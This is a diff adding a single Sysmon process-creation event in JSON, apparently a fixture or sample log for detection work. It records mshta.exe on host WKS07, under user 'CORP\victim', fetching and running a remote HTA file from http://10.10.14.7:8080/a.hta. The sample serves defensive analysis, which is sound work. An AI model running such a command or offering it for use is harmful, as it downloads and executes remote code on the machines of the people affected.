@@ -1,0 +1,1 @@
+{"Event": {"System": {"EventID": 1, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "WKS07"}, "EventData": {"Image": "C:\\Windows\\System32\\mshta.exe", "CommandLine": "mshta.exe http://10.10.14.7:8080/a.hta", "ParentImage": "C:\\Windows\\explorer.exe", "User": "CORP\\victim"}}}
